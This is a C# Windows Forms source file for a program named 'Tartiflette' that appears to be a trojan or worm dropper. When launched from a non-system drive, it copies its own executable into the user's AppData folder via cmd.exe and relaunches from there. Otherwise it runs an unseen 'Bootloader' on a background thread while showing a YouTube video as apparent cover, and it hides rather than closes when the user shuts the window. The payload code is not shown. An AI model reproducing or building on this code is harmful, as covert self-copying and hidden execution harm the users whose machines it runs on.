using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Tartiflette
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            this.Load += ExecuteMAIN;
            InitializeComponent();
            this.FormClosing += CloseWindows;
        }

        private void CloseWindows(object sender,FormClosingEventArgs e)
        {
            this.ShowInTaskbar = false;
            this.Hide();
        }

        private void ExecuteMAIN(object sender,EventArgs e)
        {
            if (!CheckIfStartInOSDrive())
            {
                try
                {
                    string appdata = Environment.GetEnvironmentVariable("appdata");
                    string drive = Path.GetPathRoot(Environment.SystemDirectory);

                    // Move file to user APPDATA 
                    Directory.CreateDirectory($@"{appdata}\Tarte");
                    Process.Start(new ProcessStartInfo($@"{drive}\Windows\System32\cmd.exe",
                        $@"/C copy /b {Application.ProductName}.exe {appdata}\Tarte\"));

                    Process.Start(new ProcessStartInfo($@"{drive}\Windows\System32\cmd.exe",
                        $@"/C start {appdata}\Tarte\{Application.ProductName}.exe"));
                    Environment.Exit(0);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
                
            }
            else
            {
                new Thread(new ThreadStart(() => { Bootloader.Run(); })).Start();
                this.wbrView.Navigate("https://youtu.be/CDwW1Mzrh3o");
                this.wbrView.Refresh();
            }
        }

        private bool CheckIfStartInOSDrive()
        {
            bool result = false;
            string drive = Path.GetPathRoot(Environment.SystemDirectory);
            string driveStartup = Application.StartupPath.ToUpper().Substring(0,3);
            if (driveStartup == drive)
            {
                result = true;
            }
            return result;
        }
    }
}
